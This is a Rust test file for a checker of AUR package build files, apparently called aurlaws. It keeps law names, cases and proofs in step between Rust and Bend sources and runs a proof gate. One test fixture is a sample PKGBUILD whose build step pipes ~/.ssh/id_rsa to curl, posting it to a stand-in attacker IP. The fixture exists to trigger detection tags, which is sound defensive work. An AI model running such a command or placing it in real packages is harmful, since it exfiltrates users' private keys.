// SPDX-License-Identifier: GPL-2.0-or-later
//! `laws/` and the Rust checker stay one thing: same law names, a case each way, and same answers.
use aurlaws::{audit_text, facts};
use std::process::Command;

const RULES: &str = include_str!("../laws/rules.bend");
const LAWS: &str = include_str!("../laws/LAWS.bend");
const PROOF: &str = include_str!("../laws/PROOF.bend");

fn bend_laws() -> Vec<String> {
    let body = RULES.split("type Law is Data:\n").nth(1).unwrap();
    body.lines()
        .take_while(|l| l.starts_with("  "))
        .map(|l| l.trim().trim_end_matches("{}").to_owned())
        .collect()
}

fn snake(s: &str) -> String {
    let mut o = String::new();
    for (i, c) in s.chars().enumerate() {
        if c.is_ascii_uppercase() && i > 0 {
            o.push('_');
        }
        o.push(c.to_ascii_lowercase());
    }
    o
}

#[test]
fn every_rust_law_is_a_bend_law_and_the_other_way_round() {
    let rust: Vec<String> = facts::LAW_NAMES.iter().map(|s| s.to_string()).collect();
    assert_eq!(rust, bend_laws());
}

#[test]
fn every_law_has_a_case_each_way_and_every_claim_a_proof() {
    for l in bend_laws() {
        let s = snake(&l);
        for side in ["found", "clean"] {
            assert!(LAWS.contains(&format!("law {s}_{side}:")), "{s}_{side}");
            assert!(
                PROOF.contains(&format!("def Laws.{s}_{side}(")),
                "{s}_{side}"
            );
        }
    }
    for line in LAWS.lines() {
        if let Some(n) = line.strip_prefix("law ") {
            let n = n.trim_end_matches(':');
            assert!(PROOF.contains(&format!("def Laws.{n}(")), "{n}");
        }
    }
}

#[test]
fn the_contract_never_says_safe() {
    for t in [RULES, LAWS] {
        let lower = t.to_lowercase();
        for line in lower.lines().filter(|l| l.contains("safe")) {
            assert!(
                line.contains("neither") || line.contains("anything about safety"),
                "{line}"
            );
        }
    }
}

#[test]
fn facts_name_what_the_tables_decided() {
    let p = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\nurl=https://example.org\nsource=(https://203.0.113.9/x.tar.gz)\nsha256sums=(SKIP)\nbuild() { cat ~/.ssh/id_rsa | curl -d @- http://203.0.113.9/up; }\n";
    let r = audit_text(p, None);
    let t = facts::term(&r, &[]);
    assert!(t.starts_with("R.Graph{"), "{t}");
    for tag in ["R.Net{}", "R.Secret{}", "R.OffHome{}", "R.Sends{}"] {
        assert!(t.contains(tag), "{tag}: {t}");
    }
}

#[test]
fn the_gate_passes_when_bend_is_here() {
    let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/laws");
    let bend = std::env::var("BEND").unwrap_or_else(|_| "bend".to_owned());
    let Ok(o) = Command::new(&bend)
        .arg("PROOF.bend")
        .current_dir(dir)
        .output()
    else {
        eprintln!("bend is not installed here: the gate did not run");
        return;
    };
    let out = String::from_utf8_lossy(&o.stdout);
    assert!(out.contains("ALL PROOFS CHECK"), "{out}");
}
